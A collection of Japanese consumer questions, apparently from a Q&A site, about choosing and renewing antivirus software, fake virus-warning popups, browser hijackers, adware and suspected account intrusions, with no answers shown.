困っています。 先ほどネット閲覧中に、ウイルスに感染した様ですと表示され、削除の為ということでmac keeperというのが出てきてダウンロードしてみたんですが、ジャンクファイルがどうのばかりでウイルスがどうなったんだか全く分かりません。これはもしかしてそのソフトを買ってもらう為の偽ウイルスなのかとも思ってしまいますが、実際どうなのか確認できないものでしょうか？ パソコン機器には疎いもので本当にさっぱり分かりません。使っているパソコンはMacBook Airです よろしくお願いします
最近ウィルスバスターの期限が切れかけたので、クラウド１０を導入したら、 １．モジラのメールが送受信出来なくなりました。 ２．ジャストシステムのクラウドのアップ、ダウンロードが出来なくなりました。 ３．WEBは困ることはありません、表示もされます。 ４．動画のダウンロードは出来るものの、フリーメイクダウンローダーでの保存が出来なくなり 画像がありません…と出ます。 ウィルスソフトを停止したら、全て問題なく出来ます。 いちいち停止とウィルスが怖いのでどうすれば良いか、教えて下さい。
youtubeを見ていて、「お使いのパソコンはマルウェアに感染しています。マルウェア駆除。」という 広告が出てきて、「問題を解決する」ボタンを押してしまいました。しまったと思い、それ以上の操作はせず、すぐにブラウザは閉じたのですが、クリックするだけで有料なマルウェアに感染するというようなネット上のコメントもあり、不安です。 住所、メールアドレス等情報は何も入れておらず、ウイルスソフトでの検査でもウイルスは検知されないのですが、請求が来たり、情報が漏れたりする様な事はあるのでしょうか？
こんにちは、Windows Vista 　 Internet Explore 9 です、宜しくお願い致します。 最近、Internet Exploreを立ち上げると下のようなダイヤログが立ち上がるようになりました。 何故このようになったのでしょうか、特に設定を変えたような覚えはないのですが。 この意味はどのような意味でしょうか、Vuirusと関係があるのでしょうか。 危険そうなサイトを開いた覚えもありません。非常に不安です。 また、これを修復するにはどこをどのように設定を変更すればよいのでしょうか。 宜しくお願い致します。 ====================================================== Internet セキュリティ Webサイトで、このプログラムを使ってWebコンテンツを開こうとしてい ます。 このプログラムは保護モードの外で開かれています。Internet Exploreの保護 モードはお使いのコンピュターを保護するのに役立ちます。 このWebサイトを信頼していない場合は、このプログラムは開かないでください。 名前 MicroSoft Office IME 2007 発行元 MicroSoft Corporation 許可する　　　　　許可しない =======================================================
グーグルクロムを立ち上げると、googleクロムに似た、istartsurfという検索エンジンが出てきます。ノートンから「危険」のサインが出るので、設定の中身を調べたらbingbingという訳の解らない検索エンジンが収まっており、削除しようとしてもできません。どうすれば良いですか？何方か助けて下さいm( )m
avastという無料アンチウイルスソフトをpcにダウンロードしたのですが、このソフトがあればフラッシュエロゲーにもウイルスを気にせずプレイできるのでしょうか？！
週に一回程度自動でスキャンが行われます。そこそこデータが溜まっているため、時間を有しますが、９９％から先に掛かる時間が恐らく９９％に到達するまで以上に掛かっている感覚です。 この残り１％に尋常でなく時間が掛かる理由は何なのでしょうか？ 過去にウイルスを拾っていた事はありませんが、２百万からある断片の最後の最後でウイルスが潜んでいる可能性などが果たして有るのか懐疑的です。 終了まで静観がベストは判っていますが、次点の良策は有りますか？
先日知り合いにUSBに写真を入れて貸しましたところ、トロイの木馬に感染していると言われました。 ウイルスセキュリティ ZERO を入れていますが、スキャンしても問題なしと出ます。 ノートンのパワーイレイサーも試しましたが同じ結果でした。 どうしたらいいですか？ 前のパソコンでも同じことを言われました。もしかして前のパソコンから移ったとかでしょうか？ 皆さんの知識を教えて下さい。
OCNの「おまかせマルチパック」の セキュリティ対策ソフト「マイセキュア for マルチデバイス」というサービスがあるらしいんですが、 PCのウィルス対策として どうでしょう？ ノートンなどと比較して。
今、使っているパソコンのセキュリティソフトはノートンですが、 もうじき有効期限が切れます。 今、OCNプレミアムサポートに申し込んであり、メールのセキュリティはOCNのほうで行っています。 今度、もう一台PCを購入する予定で、 その際、ノートンか、ノートン以外のセキュリティソフトを入れようと思いますが、 OCNのマルチパックというサービスでも インターネットのセキュリティがついているようなので、しかも スマートフォンやタブレットなど３台までOKだということなので、マルチパックを検討中です。 月々９５０円。 ノートンを搭載すると、PCが重くなりませんか？ ノートン以外にもいろんなセキュリティはあると思いますが、、どれが良いのでしょう？ それぞれのソフトの違いは・・？ 価格なども含め、、 ざっくりした質問で申し訳ないのですが、当方PCには疎いタイプなので、 あまり専門的な用語を使われても理解できませんので、 子どもでもわかるように説明していただければ幸いです（笑）。
ZEROというのが、格安でありますがどうなんでしょうか? 「安かろう悪かろう」なのでしょうか? 価格からいけばこれになるのでしょうが、なぜ、マカフィーなどを使うのでしょうか？ どれぐらいの差があるのか教えて欲しいのです。 よろしくお願いします。
DVDドライブにノートンを挿入してすぐに出る 「ソフトウェアとゲームに対しては常に次の動作を行う」 にはチェックを入れた方が良いですか。 ウィンドウズパソコンを使うのが初めてでよく分かりません。
ネットバンクなどのパスワードの、ネット上での流出対策についてお聞きします。 一応マカフィーを導入し、ソフトなどの更新もしているのですが、なにぶんパソコン初心者のため不安です。 次のような対策をしていれば、パスワードの流出の危険性は低くなるでしょうか? １、使い回しをしない ２、ソフトウェアキーボードを利用する ３、フィッシングメールに注意する ４、偽ポップアップ画面に注意する 基本的な対策で何か抜けているものはありますでしょうか? どうぞよろしくお願い致します。 送金などにはワンタイムパスワードが必要な銀行です。 ネット上でのパスワードの流出対策についての質問です。
ttp://www.styledesign.jp/menubody/b_weight/ （閲覧注意） 上のURLのサイトをスマホ（Android）で見ました（上記アドレスは間違って踏まないよう念のため　最初のhを抜いてあります。見る場合はhを追加して下さい） なんだか、どんどんページが切り替わり、最後はモンストというゲームをインストールグーグルプレイに飛ばされました。 それをバックボタンで戻ると、今度は「ウィルスに感染しました、OKボタンを押してウィルスを駆除して下さい」なるメッセージが。 詐欺くさいのでOKボタンは押しませんでした。 上記アドレスはパソコンで見ると何も問題なく表示されます。 スマホで見た場合のみ上のようなおかしなことになります。 これは何だったのでしょうか？ 私のスマホはウィルスにやられたのでしょうか？ ソニーXperia　Z3です。 ブラウザはXperiaに最初から入れられてる標準のやつです。
PCやスマホではなく、3DSやvitaなどのブラウザでウイルスサイトにアクセスすると感染しますか？
ノートン３６０をいれていますが、いきなりカードで料金が落ちてしまいました。 お知らせのメールに気が付いていなかったのかも知れませんが… しかも９６９８円も落ちています。そんなに高かったでしょうか？ あと何日というメッセージはどこからみるのでしょうか？わからなくなってしまいました。 おしえてください。できれば他のソフトに変えたかったのに…・
タブレットＰＣでwindows10、ノートンインターネットセキュリティを利用しています。 ここ2週間ほど、ＰＣの動作が重く、インターネットが途中で途切れたり、 windows Defender とノートンインターネットセキュリティが両方無効になったりしました。 両方が無効になった時に、windows Defenderの項目を有効にしようとしたら、 ノートンインターネットセキュリティが優先するとして、有効にならなかったりしました。 そのため、ノートンインターネットセキュリティを無効にして、windows Defenderのみにしたら、 動作が安定して、インターネットも途切れなくなりました。 （逆に、ノートンインターネットセキュリティのみを有効にし、windows Defenderを無効にしても 動作は安定しませんでした。） そこで質問です。 windows10では、セキュリティ機能が高まったようなことを聞きましたが、windows Defenderのみ のセキュリティではいけないでしょうか？ また、もし、windows Defenderのみではダメであれば、上記のような症状の場合、どのような対応 をすればいいでしょうか？
Windows7を使っていますが近ごろ繋がりが遅い。パソコンのせいかそれとも通信契約でしょうか？
今日付けで話題に乗り出した、ばらまき迷惑メールの添付ファイルを開いてしまいました。 どうすればいいでしょうか？ タンケンー請求書(日東印刷 新井勇司)」 で検索すると、朝はなにも引っかからなかったのですが、今検索するとスパムメールであるので 添付ファイルは開かないように、という情報が出ていました。 添付のワードファイルはマクロウィルスとの情報が出ているんですが、 開いてしまった場合どうすればいいでしょうか？ バックグランドでプログラムが走っていると思うと怖いです。
Win　OS　10 McAfeeのアンインストール実行しようとすると「管理モード」の為、アンインストール出来ません。 ～と、エラー表示されて削除出来ません。 無料ソフトの「Revo Uninstaller」を試してみましたが同様に削除できませんでした。 アドバイスお願いします。
パソコンのウィルス対策ソフトは有料、無料などがありますが、どのような違いがあるのでしょうか？
googleではgmailだけをたまに利用していますが、昨日、メインアドレス（他社）の方に、1週間前の日付で警告メッセージが来ていたことに気づきました。 「お使いの Google アカウント（xxx@gmail.com）が Windows の Internet Explorer からのログインに使用されました。このアクティビティに心当たりがありますか?」というものです。 gmailは長い間使っていなかったのですが、「お気に入り」を整理するときに開いたかもしれなくて、情けないことに、日時的に思い当たるかどうか、はっきりしません。 ただ、私は千葉県在住なのに、ロケーションが「静岡県」となっているのが気味悪くて、パスワードを変更、結局、アカウントも削除しました。 そして、前から作成してあった予備のgoogleアカウントを使うことにしました。 その際、パスワードを変更、念のため、「最近のセキュリティイベント」のページで確認したところ、 ずっと同じパソコン、同じ接続業者なのに、 「新しいデバイス（Windows)にログインしました」とあり、 私がパスワードを変更した時刻の記録上のロケーションが「静岡県」なのです。 しつこく更に２回も変更してみましたが、「静岡県」となります。 gmailのページから「アカウントアクティビティの詳細」でIPアドレスを確認すると、 １度目の変更時は静岡、２度目と３度目の変更時は千葉のIPアドレスとなっています。 ただでさえ機械には弱いのに、ワケが分かりません。 長くなりましたが、教えていただきたいのは３点です。 （ちなみに、Windows7、IE11です） ①　単にIPアドレス表記上のミスだから心配ないのか、それとも悪意ある不正アクセスの可能性が高いのでしょうか ②　ずっと同じパソコンしか使っていないけれど、数か月ぶりにログインすると、新しいデバイスとみなされることがあるのか、それとも不正アクセスを疑うべきでしょうか ③　googleアカウントではgmailしか使っていないので、クレジットカード情報等の流出の恐れはありませんが、アカウントそのものがマルウェアに感染したり、用心した方がいい点はあるのでしょうか。 一応、毎日、MS Security Essentials でフルスキャンはしているのですが・・・ どうしたらいいのか、不安で、途方に暮れています。 お詳しい方がいらっしゃいましたら、どうぞ教えてください。
先日ノートンインターネットセキュリティーの期限が近づいてきたので ネットから期限を更新しました。（2015？？ですかね？現時点で最新のものです） パソコン３台分のにしました。 ノートンインターネットセキュリティーよりノートンセキュリティーのほうが良いみたいなことを聞いたのでノートンセキュリティーにしましたが パソコンの中にインストールされたのはノートンインターネットセキュリティーでした。 ノートンのチャットサービスで対応してもらってたのですが インストールされるのはノートンインターネットセキュリティーなので問題ないとのことでした。 概念が分かりません。 ノートンインターネットセキュリティーとノートンセキュリティーの違いを教えてください。
window8.0ですが、先日初期化してみたにも関わらず、更新プログラムのお知らせが来る度に、電源を更新して再起動するのてですが、構成しています…のメッセージで98％まで行っても、更新に失敗しました…とメッセージが出て、もとに戻ります。 エースースのX202Eという機種です。 コールセンターに聞いても、結局初期化して…との提案ばかりです。 たくさんのアプリを入れ直したり、何度も初期化するなら、新たな機種に変更したらとも思いますが、 当面この機種でなんとかならないものかと、お伺いいたします。 キチンと更新プログラムが再構成されるためにはどんな手段がよろしいでしょうか？
一つ教えていただきたいのですが、 最近「Internet Explorer」や「firefox」のアドレスが勝手に変わります。 「Internet Explorer」→http://www.search-eyes.tk/ 「firefox」→http://www.safe-web.tk/ です。 何度設定しても変わってしまうので、何が何だかわかりません。 これはウィルスですか？　スパイウェアですか？ 何かご存知の方がいらしたらご教授お願いします。
現在、ブログ記事の文字は標準で作成し、画面は１２５％で閲覧 このたび、記事を印刷し纏めようすると文字が小さく印刷されて 読みづらく、印刷するときのみ大でしたいのですが方法が解りません。 宜しく、お願します。
スマホのウイルスアプリ「Dr.web」を使っているのですが、先ほど「Android.SmsSend.280.origin」ってのが検出されました。 ほとんど使ってなくて開く事もないカカオトークからの検出なんですが、これが何か分かる方はいますか？ カカオトークのアプリごと削除したほうがいいですか？
表題のとおりなのですが、製品版へするべく楽天よりダウンロード版を購入しシリアル番号も入手しましたが、このシリアル番号はどこから入力すればよいのでしょうか？ せっかく買ったのにシリアル番号が使えずじまいになってしまっており、製品を使えずにおります よろしくお願い致します
zonealarmをインストールしたのですが、アンチウイルスだけインストールできません。 どうしたらいいですか?
今日、突然、Avastで、英語の画面が出るようになっていました。 たぶん、何かがオンラインじゃないって意味だと思うんですが、パソコンはオンラインですし、訳が分かりません。 しょっちゅう出てくるので、心配になります。 メッセージの意味、解決方法のわかる人、教えてください。
先日、ネットカフェを利用していたら、画面下部に「silverrightは最新のものではなく更新が必要なためブロックされました。」という表示が出て、右側に「更新（U)」と「今回は実行（R)」と二通り選択出来るようになっていました。 自分自身は「更新（U）」を選択したかったのですが、手が滑ってマウス操作を誤り、「今回は実行（R)」のボタンをクリックしてしまいました。 しかし、後でよくよく考えて、PCに不具合を起こすウイルスに感染したらどうしよう？と怖くました。 勿論、お店ではきちんとウイルス対策をしていらっしゃるのでしょうが、それでもやはり不安は残ります。 この場合、PCに重篤な被害をこうむる可能性というのは考えられるでしょうか？ 不思議なことに上記のメッセージは「更新（U)」を選択した場合でも、何度も繰り返し画面に表示 されます。 どなたかセキュリティ関連にお詳しい方、ご回答お待ちしております。
Windows7 ＰＣを、予備機に使っています。そこに、セキュリティソフトをインストールしたいのですが、ググってみても、たくさん出てきて、どれが、一番信頼性があって有効なのか、選びかねています。ご使用経験や、情報から、より良いものはどれなのか、ご教示願えれば、幸いです。 よろしくお願いいたします。
[貴女の情報は世界に知られています]とか[除去するにはokを押して下さい]などの画面が出て来て、画面にはキャンセルボタンが有るのですが押しても先に進めずに又、元の画面に戻ってしまいます。 その場合は電源を落とし又、電源を入れて使用を開始すると正常に使えます。 これはどの様な原因が考えられますか？ 「私はもう、インターネットとか言うのは怖いからやらないよ！」と先日、言われてしまいましたが、せっかくスマホを持っているのですから、インターネットで情報を取れないのは勿体ないと思っています。 どうすればいいのでしょうか？履歴とか消せば直るとか？ 教えて下さい。
現在、マカフィーを使っています。 Ｙａｈｏｏ！の検索を利用したりすると、検索結果に「これは、安全なリンクです」と表示されるので、結構良いと思っています。 キヤノンITソリューションズの「ESET ファミリー セキュリティ 」は、価格が安いので気になっていますが、サイトの安全性は分かりますか？
ウィルスバスタークラウドのポップアップ宣伝がうざくて、何とかしたいです。 期限切れが近づいてきたので、 以前、知らない間に保険サポートに契約してしまい、 自分には必要のないオプションだったので、 トレンドマイクロのサポートに連絡して、 元のクラウドのみにしてもらい、契約更新しました。 契約更新したので、もうポップアップ宣伝はでないとおもったら、 写真のポップアップ宣伝が、頻繁に表示され困ってます。 どうしたらポップアップしなくなりますか？ やはり、トレンドマイクロに連絡しないといけませんか?
私と父親でパソコンを１台ずつ持っています。 「マカフィー リブセーフ 1ユーザー 3年版」というのは台数制限がないみたいですが、２台に使えないのでしょうか？ ちなみにメールは私だけ使っていて、父親は使っていません。
ＮＥＣ　ノートパソコン　ＬＬ550（購入時より9年）ですが、半年前にウィルス（ボットかも？）にやられた可能性があるので封印していました（ネットにはつながずたまに立ち上げていました）。 　数ヶ月して本日、電源入れましたが全く反応せず、立ち上がろうとしても何も出ません（真っ暗、ただファンは動いています）。こういう場合、電源故障、マザーボード等の故障らしいですが（年数からこれは仕方ないと思うのですが）、ウィルス（ボット）が原因でこの様な立ち上がらない症状の可能性はあるのでしょうか、単なる経年劣化でしょうか。 今更修理もしないつもりですが、ハードは生きているでしょうか（ウィルスは以前よりバスターを入れていました、またネットにつながずマイクロソフトのウィルスチェックを他でダウンロードしＣＤに落としチェックしましたが何も出ませんでした）
今日になってから、愛用のchromeブラウザがおかしな挙動を行うようになりました。 1.新しいタブで開かれるはずのリンクが、なぜか同じタブの中で遷移してしまう。 2.ページの所々の単語で「スポンサーへのリンク」みたいなのが勝手に発生する。リンク先はアフィリエイトっぽいサイトでした。ちなみに、発生したページはこれまで観察した限りでは「小説家になろう」に限定されています。 3.feedlyで更新されたページの件名をクリックすると記事の要約(全文が出てくるサイトも有りますが)が開くのが普通ですが、なぜかその記事の本体に飛ばされる。 4.何かインストールしている拡張機能が悪さでもしているのかと調べてみてもいつものおなじみ拡張機能しか入っていない。 以前食らったマルウェアに比べれば格段におとなしい症状しか出てきていませんが、不便なことは不便だし、薄気味が悪いのです。 こういった症状のマルウェア、アドウェアに心当たりがある方はいらっしゃらないでしょうか。 osはwindows7 home premium(x64)、ウィルスバスターの最新版が常駐してます。
１年版５台まで使えるカスペルスキーを持っています。 パソコンとAndroidに入れました。 残り３台使えると思うのですが自分はもう必要ありません。 このような場合は友人や他人にあげてもいいのでしょうか。 中に書いてあるアクティベーションコードを教えてあげれば相手は使えるのでしょうか。
新品未開封の「Norton AntiVirus 2003」が見つかったのですが、 今でも使用可能でしょうか？ 知人から使えそうなら送るから、送料だけ負担してとの事です。 プロダクトキーが分かれば、入力してみるのですが、 知人はパソコン関連にうといので、シリアルキーやプロダクトキー等聞いてもよく分からないそうです。 私自身は「ノートン　インターネット　セキュリティ」を使用中です。
ＰＣのセキュリティーソフトが　もうすぐ期限切れという事で 2015,9,19日現在　お勧めがあれば教えてください
自営業者です。 顧客情報も入っているＰＣのセキュリティソフトの期限切れが近づいてきました。 延長か切り替えを検討していますが、いま買い替えるとしたらどちらがオススメでしょう？ 価格ドットコムでは、売れ筋・注目度・満足度の３ランキングのトップ３が、、、 　 １位　ＥＳＥＴ　ファミリー～ ２位　ＥＳＥＴ　パーソナル～ ３位　ノートン　セキュリティ～ ４位以下はウイルスバスター、カペルスキー、ゼロ、というところ。 現在は「ノートン　インターネットセキュリティ」を使用しています。 価格がやや高いので、評判の良さそうなＥＳＥTの方がコスパも良さそうななので切り替えようかとも考えています。 ただ気になるのはセキュリティの能力です。 ノートンとＥＳＥＴでは性能面ではどのような違いがあるでしょうか？ 宜しくお願いします。 （ＯＳはwindows7。10へ移行は未定。台数は１台。３年以内に増える可能性も少しあり）
Windows7です。 DNSアンロッカーというのが消えません ある日クロームを開いたら右側に広告みたいなのが出てくるようになりました。 広告が出てくるサイトと出てこないサイトがあります。（ＤＭＭでゲームしようとしたら出てくる。）(商品紹介サイトマイページには出ないが商品詳細説明ページにだけ出てくる。) その広告は文字化けしてたり日本語だったり。 下に薄く「協力：DNSUnlocker」とありました。 それとタスクバーのところに、謎の木の葉マークみたいなのも出てきました。その名前だけ確認したら「DNSUnlocker」でした。 あとはサイト内のクリックできる場所を軽くクリックすると、「技術サポートPC相談掲示板」？みたいなサイトに飛ばされたり…。 他にもサポート系のサイトに飛ばされる。個人サイトみたいな。 たまにそういうのがあり、ページを消して再度同じ場所クリックしたら、今度は大丈夫だったりとか。 ・履歴やクッキーなどを削除。 ・コントロールパネル→アンインストール「DNSUnlocker」でアンインストール完了した。木の葉マークも消えた。 ・ＭＳＥでフルスキャン。「勝手に設定をいじるよ」という内容のものを発見。削除。(これは以前からちょくちょく出てくるやつです；；たとえばクロームが自動的に更新できなくなっていたり。それ以外の不具合は確認できていません。分かりません。) ・クロームの再起動 ・クロームの更新状況を確認。最新版になっていた。 ・拡張機能を確認。特に怪しいのは無し。 ・PC再起動 以上をやりましたが、あいかわらず広告は出てきています。 木の葉マークも消えたし。アンインストールもしたし。フルスキャンもしたのですが。 あとは何をすればいいのでしょうか。あんまりパソコンに詳しくなく…。 システムの復元しかないでしょうか。 それかクロームの再インストール？ どなたか教えてください。
こんにちは、昨晩ウイルスバスターでウイルス除去をしたのですが今日ＰＣでネットを使ってたら英語でＰＣ関係の警告が出てチカチカひかってて目障りです、その後ＰＣサポートサービスに勝手に繋がったりと散々でした、よく見るとＡｄ　ｂｙ　ＤＮＳＵｎｌｏｃｋｅｒと小さく書いてあって調べてみたところ有害と感じたので　コントロールパネル／プログラムのアンインストールで削除したのですが治りません、どうすればいいですか？　再起動はしていません、ＰＣはウィンドウズ７です。 分かる方お願いします<(_ _)>
最新のノートンセキュリティーが勝手に最適化しないようにする設定方法教えてください。 また注意のパフォーマンスでボタンワンクリックで自動で最適化しない設定方法も教えてください。 いつも最適化してパソコンおかしくなります。 したくない。
15年間使った　ウィルスバスター　高いし重く感じるので、 ESETに変える決意をしました。 ・ウィルスバスター　３台のPCまで　３年間　約11000円 ・ESET　５台のPCあるいはAndroidのスマホもOK　で３年間　5000円強　 ・ウィルスバスター3年版3か月延長キャンペーンから無視し続け期限まで残すところ今月末。 ・郵便も2回来ました。 ESET体験版をメインPC で使って約20日　特に問題がありませんでした。 ・インターネットはあらゆるところを見るほうだと思います。 しかしながら・・・ チェーン家電量販店の店頭では。 ・ウィルスバスターズ ・ノートン ・マカフィー ここまではどこでも売っています。 これに加えて、 ・セキュリティZERO（同じOSの間は更新料無料） ・カスペルスキー を売っている店まではあるのですが､ ESETを私の地方のお店では見たことがありません。 都会のお店のネットショッピングで3年版パッケージを購入しました。 質問 ・インターネット上では評判が良い、ESET　なぜ店頭ではあまり売っていないのですか？ マージンが少ない？　販売力が弱い？　法人需要が多い？ 家庭用で使って大丈夫でしょうか？　変えたものの不安はあります。
ひと月前、無料のお試しノートンをインストールしましたがあと一日で切れるので、約ひと月前に買っておいたノートン３年版ＣＤをいざインストールしようとしたら・・ 問題発生となり、「古いバージョンをインストールしようとしています。古いのを入れたかったら、新しいバージョンを削除してください」 という風な文句が出てインストールできませんでした なぜ、まだ買ったばかりのノートンなのに古いのか？無料ノートンよりも古いのをインストールしても日々修正されて自動更新とかされるからすぐ新しくなり問題ないということなのでしょうか？ そういうパソコンばかりやってるわけでない人にとって当たり前の疑問についてがなにも説明されていないので困ってしまいました 新しい無料ノートンを削除して、買ったばかりの古い方をそのままインストールすればいいのでしょうか？ 新しいバージョンをなぜシマンテックは送って来ないのでしょうか？
今もネット可能なＸＰがあるのですが、バスター等は使用できません。もし無料配布のウィルス対策ソフトを使用した場合、このパソコンは壊れてもいいのですが、使用している家で使用している他のパソコンに感染等の被害はあるでしょうか（他のパソコン等へメール等送る事はないが同じルーターを使用しています。） 今もＸＰでネットッされている方はどうしているのでしょうか。
Windows7からWindows10へupgradeして、その後新しいセキュリティソフト（ウィルスバスター）をインストールしました。しかしWindows10ではマウスが動かない等のトラブル続きで、今日Windows7へ戻しました。そこでお尋ねしたいのですが、Windows7でもこの新しいセキュリティソフトは有効なのでしょうか？（もう一度インストールする必要はありませんか？）
Windows8のデスクトップ型のパソコンを使っております。 ウイルスに感染したのではないかと思いますが、最近画面等の挙動がおかしいような気がします。 症状としてはマウスポインターの形が変わってしまい一時的にマウスによる制御ができなくなる、しばらくすると治りますが不便です(マウスポインターの脇に人の手がくっついたような形になってしまいます)。またネット接続してホームページ等を閲覧している際に「ガバッ」というような音がしていきなりスタート画面にもどってしまう。また画面上の異常はなくても「ガバッ」とか「カチッ」というような異音がスピーカーから出る。以上のようなものです。 ウイルスに感染したと考え、ウイルスソフトでスキャンしてみますがめぼしいものは検出されないようです。ソフトはノートンを使用しております。 どなたか詳しい解説、対処法をご教授いただけると幸いでございます。 よろしくお願いいたします。
マカフィー インターネットセキュリティ 2015 1年版インストールについて CDがなくなったせいかカードのみでインストールがなかなかすすめません MISにアクセスができませんプロダクトキーあってもログインしていても なかなか先へ進めませんわかりづらいせっかく買ったのに使用ができずらい ソフトにかわったみたいですかわりにほかのソフト購入をすすめる画面は かならずでてきますCDがなくなってよけいにつかえないソフトにかわって ゆくみたいですすむうすに使っている方アクセス方法おしえてください。 ご回答宜しくお願いいたします。
フィッシングメールや、ニセのポップアップ画面でなく、 正規のサイトで入力したカード番号などを盗み取るウィルスもあるのでしょうか？ 　 利用した店舗から流出するケースはここでは除外します。 あくまで自分のパソコンが原因の場合です。 使うのは、家族だけが使用するパソコンのみです。 ＯＳはウィンドウズ７です。 インストールしてあるマカフィーは、いつも安全だといっています。 ファイアーウォールはいつも有効にしています。 接続は有線ＬＡＮです。 設定は？ですが、ルーターをはさんでいます。 たいしたカードや預金残高ではないのですが、 パソコンごと乗っ取られる、なんていうケースも珍しくないのでしょうか？ パソコン初心者ですがどうぞよろしくお願い致します。
ＰＣに新たに有料のセキュリティソフトをインストールすることにしました。 これまでに無料のセキュリティソフトや、ネットバンキング提供のセキュリティソフトを インストールしています。これらはアンインストールしたほうがいいでしょうか？
セキュリティのため、他の会社とやりとりするときはUSBメモリを使っているのですが、やりとりするたびにクイックフォーマットをかけ、複数のPCでそれぞれウイルスチェックをかけております。 以前、このサイトで伺ったのですが、クイックフォーマットをかければUSBメモリ中のファイルが読み出し不能となりその中のウイルスが起動できなくなるためウイルスチェックは不要となるというような説明を受けたのですが、追加で教えていただきたいことがあります。 ファイルの中のウイルスはクイックフォーマットのみで良いとしても、USBメモリ中の空の領域にウイルスがいる可能性はないのでしょうか？また、その場合もクイックフォーマットでウイルスは消える、もしくは活動できなくなるのでしょうか？ なお、windousのバージョンはvistaです。
昨日、ソフトをDLしたらウイルスにかかったみたいでネット中に広告が表示されます DLした覚えがないのをアンインストールしようとしたら計算問題がでてアンインストールが失敗します Great Findの削除の仕方を教えてください お願いします
当方、acerのノートPCを使用しております。 最近までネットセキュリティのソフトが期限切れなのを忘れており、急遽フリーソフトのAVGをインストールし対処したところ、5～10分おきぐらいに以下の表示がされるようになりました。 AVG検出 脅威：一般的動作検出 オブジェクト名：C:\USERS\(コンピュータ名)\APPDATA\LOCAL\DELTA\DELTA\1.3.28.3\..\UPDT.JS 一応「保護します｣をクリックし、数秒後「脅威は駆除されました」となって表示はおさまるんですが、しばらくたつとまた表示されます。 AVGソフトを入れた際にスキャンの段階で、DELTAのソフトが入っているのがわかったので、すべてアンインストールしました。現段階で上記のようなファイルは見つからず存在しないようですが、まだ潜んでいるということでしょうか。はたまた何かしらのウィルスにかかったままなのでしょうか。 こうやって入力している際にも表示が邪魔をしてうっとおしいことこの上ないです。 解決方法をご教授ください。お願いします。
Twitterで誤ってマルウェアを踏んでしまいました。今のところ、被害はTwitterで踏んだURLと、同じURLを貼ったアカウントが自分のinstagramのアカウントにフォローしにきたぐらいです。 これはヤバイ奴ですか？ 機種はiPhoneです。
windows10 へアップグレードを考えてますが、現在使用のセキュリティソフトも対応したバージョンにしなければなりません。windows10にセキュリティソフトが付属していると聞きましたが、機能として満足できるものでしょうか。
5年前に買った小さいノートパソコン ネットブック？だったか、引越してネットをつないでなかったので、三年半肥やしになってました。 今日、ワイファイ繋いだので、久々にひらいてみて、無料ウィルスソフトダウンロードしようとしたけど、 画面の説明ではファイルを保存で完了で 自分のパソコンの指示だと保存するにはUS Bメモリ必要とでてきて、なんか変だなと、 他にもキーボードの設定おかしい気がして、 これはコンピューターウイルスなんでしょうか？ パソコンぜんぜ詳しくないので、教えてください。 よろしくお願いします。
インターネットでフリーソフトをダウンロードした後、high stairs adsというところからの広告が、画面に2、3か所、表示されるようになりました。 調べてみると危険なウイルスと書いているものもあり、不安です。 トロイの木馬の類だと思うのですが、どなたか詳しい方はいらっしゃいませんか？ 危険なものならば、消す方法を教えていただけないでしょうか。 補足：同時にhao123と、OPERAというものもダウンロードしてしまったのですが、それは自力でアンインストール出来ました。
DOCOMOのスマートフォンを使っていますが、ブラウザを開くたびに　m.web.seachというものから必ずスタートします。ホームページ設定は、グーグルに設定しています。PCではよくあるウィルスとの事で削除の方法が書かれていますが、スマートフォンの対処方法は見当たりませんでした。宜しくお願いします。
悪徳者に、遠隔操作させてしまいました、 初期化する前に、バックアップをしたいのですが、その間ももちろん危険なんですよね？今は、モデムもはずしています。バックアップに以前は、5時間もきりました。どうすればよいでしょうか？
以前は聞きませんでしたが、最近はガラケーでもウイルスに感染するなんて話を聞きます。昔はガラケーにウイルスなんて話は聞かなかったと思うのですが…これって本当なのでしょうか？本当だとしたら、一体何がキッカケでそうなったのでしょうか？ウイルスの種類が増えた？ガラケーの性能が上がったから？ 素人意見ですが、昔のガラケーにはなかったsimカードというものが付いたのが原因でしょうか？また、PHSではウイルス感染することはないのでしょうか？ 詳しい方、教えてください。
ウイルスバスター メイン画面表示されない
iPhoneはトロイの木馬に感染しますか？感染した時の対処方法は？教えてください。
会社で使用したUSBメモリにクイックフォーマットをした後、ウイルスチェックをしているのですが、クイックフォーマットとUSBの中のファイルの削除はセキュリティ上、どちらが安全ということはありますか？ そもそも、クイックフォーマットとファイルの削除の違いもわからないのですが、どなたかご教授願います。
私はXperiaのandroidスマホを使っているのですが、最近普通に携帯を使っていると、いきなりPlayストアの画面に飛ばされ、インストールする画面に変わったりなどし、不安だったのでLINEのアンチウイルスでスキャンしてみようと思い、そのアプリを開いていたらいきなり添付した画像の画面に切り替わりました。 これは詐欺ですか？それとも本当ですか？ どちらにせよ、どうしたらいいですか？ 回答よろしくお願いします(><)
昨年、ＷｉｎＸＰからＷｉｎ７に買い替えをした際、個人のＰＣ業者がウイルス対策ソフト「ＡＶＧ」をダウンロードしてくれましたが、その時は、「無料試用版」とは知りませんでした。今回、”ＡＶＧによる保護の有効期限が切れます。今すぐ購入してください。試用版はあと１５日で期限が切れます。”と画面に表示されました。ＷｉｎＸＰの時は、ＪＣＯＭ指定の対策ソフトに入っていましたが、ＰＣ業者はそのソフトは重いからといって、「ＡＶＧ」に変えてしまいました。ＡＶＧの有料版を購入するか、またはＪＣＯＭ指定の対策ソフトにするか、どちらがよろしいでしょうか。ＰＣ初心者です。 よろしくご教授くださるようお願いいたします。
皆さんは有料のセキュリティーソフトを使ってますか？フリーソフトの使っていますか？ 又はWindow Defenderを使っていますか？ 自分はBBセキリュティのノートン360オンラインという有料ソフトを使っています。（月５７０円） PCの用途はネットサーフィン、動画鑑賞です。 これだけなら別にWindow Defenderでもいいかなぁと思いまして。 怪しいサイトは・・・たまにXvideosなど海外のエロ動画サイトを観るくらいかなぁ 意見を聞きたいです。
スマホの電源をつける(電源を切った状態から)度に融資の案内がSMSで届きます。これは適当な電話番号に送っているのでしょうか？それなら何故起動すると届くのでしょうか？ 対策があったら教えて頂きたいです
こんにちは 早速ですが、昨晩、自分の知らない間に息子が勝手にwin10に更新したようなのですが、以降、win10と思われる待機画面が3秒程度出たあと、ブラックのまま次に進みません。 息子に確認してもよくわからないようで、何ともならない状況です。 詳細がわかっておらず申し訳ありませんが、何とかならないでしょうか 宜しくお願いします。
